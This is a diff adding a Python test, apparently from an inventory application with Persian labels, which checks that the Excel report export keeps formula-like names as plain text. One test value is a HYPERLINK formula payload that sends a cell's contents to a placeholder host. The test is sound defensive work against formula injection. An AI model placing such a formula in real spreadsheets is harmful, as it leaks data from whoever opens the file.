@@ -145,3 +145,19 @@ async def test_needing_order_matches_the_dashboard(db, admin, env):
                                                         today=TODAY)}
     _total, low = await items.count_summary(db)
     assert "2001" in needing and len(needing) == low
+
+
+def test_excel_export_never_writes_formulas():
+    """Formula injection: an item/person name starting with "=" must stay plain text in Excel."""
+    from caspian.services.reports import Column, ReportTable
+
+    evil = '=HYPERLINK("http://example.invalid/?d="&B5,"x")'
+    report = ReportTable("موجودی", [Column("کالا"), Column("مقدار", "qty")],
+                         [[evil, Decimal(3)], ["=1+1", Decimal(-2)], ["میز", Decimal(1)]],
+                         totals={1: Decimal(2)})
+    ws = load_workbook(io.BytesIO(xlsx_bytes(report))).active
+    cells = {c.value: c for row in ws.iter_rows() for c in row if c.value is not None}
+    assert cells[evil].data_type == "s"
+    assert cells["=1+1"].data_type == "s"
+    assert all(c.data_type != "f" for c in cells.values())
+    assert cells[-2].data_type == "n"  # numbers (including negatives) are still numbers
